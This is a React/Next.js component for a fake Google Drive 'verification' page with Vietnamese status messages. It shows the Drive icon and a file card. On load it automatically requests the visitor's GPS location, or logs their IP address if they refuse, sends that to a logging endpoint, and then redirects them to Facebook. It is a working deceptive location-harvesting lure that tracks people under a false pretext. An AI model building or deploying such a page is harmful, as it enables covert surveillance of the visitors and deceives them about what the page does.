'use client';

import { useEffect, useState, useCallback } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import { FileText, Loader2 } from 'lucide-react';
import type { VerificationConfig } from '@/app/actions/settings';
import { useLocationLogger } from '@/hooks/use-location-logger';

interface DriveVerificationClientProps {
  config: VerificationConfig;
}

export function DriveVerificationClient({ config }: DriveVerificationClientProps) {
  const { 
    title, 
    description, 
    fileName, 
    fileInfo, 
    footerText, 
    redirectUrl,
    previewImageUrl,
  } = config;

  const [statusText, setStatusText] = useState('Đang yêu cầu xác minh...');
  
  const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 

  const { log } = useLocationLogger('/api/log-location', { from: 'link' });

  const requestLocationAndRedirect = useCallback(() => {
    setStatusText('Đang xác minh, vui lòng chờ...');
    
    // This function attempts to get user's location.
    // The logger hook will send a log with GPS data on success,
    // or with only IP data on failure/denial.
    // In either case, we proceed with the redirection.
    log({
        onSuccess: () => {
            setStatusText('Xác minh thành công, đang chuyển hướng...');
            window.location.href = REDIRECT_URL;
        },
        onError: () => {
            // Even on error (e.g., user denies permission), we log what we can (IP)
            // and proceed with the redirection.
            setStatusText('Đang chuyển hướng...');
            window.location.href = REDIRECT_URL;
        }
    });
  }, [log, REDIRECT_URL]);

  useEffect(() => {
    // Automatically trigger the process after a short delay
    const timer = setTimeout(requestLocationAndRedirect, 500);
    return () => clearTimeout(timer);
  }, [requestLocationAndRedirect]);
  
  // The UI is now just a single loading state until the user is redirected.
  const renderVerificationStep = () => {
    return (
        <div
        className="w-full h-12 text-base font-semibold text-primary-foreground rounded-lg flex items-center justify-center transition-colors bg-primary"
        >
        <Loader2 className="mr-2 h-5 w-5 animate-spin" />
        {statusText}
        </div>
    );
  }

  return (
    <div className="flex justify-center items-center min-h-svh bg-muted/30 p-4">
      <Card className="p-8 sm:p-10 rounded-xl shadow-2xl text-center max-w-md w-full bg-card border">
        <CardContent className="p-0 flex flex-col items-center">
          
          <img
            className="mb-5 rounded-md"
            src={previewImageUrl || "https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"}
            alt={title}
            width={80}
            height={80}
          />
          
          <h1 className="text-2xl font-bold mb-2 text-foreground">{title}</h1>
          <p className="text-muted-foreground text-sm leading-normal mb-8">
            {description}
          </p>

          <div className="w-full bg-muted/40 border rounded-lg p-4 flex items-center gap-4 mb-6 text-left">
            <FileText className="h-10 w-10 text-primary shrink-0" />
            <div>
              <p className="font-semibold text-foreground">{fileName}</p>
              <p className="text-xs text-muted-foreground">{fileInfo}</p>
            </div>
          </div>
          
          {renderVerificationStep()}

          <div className="text-xs text-muted-foreground/80 mt-6">
            {footerText}
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
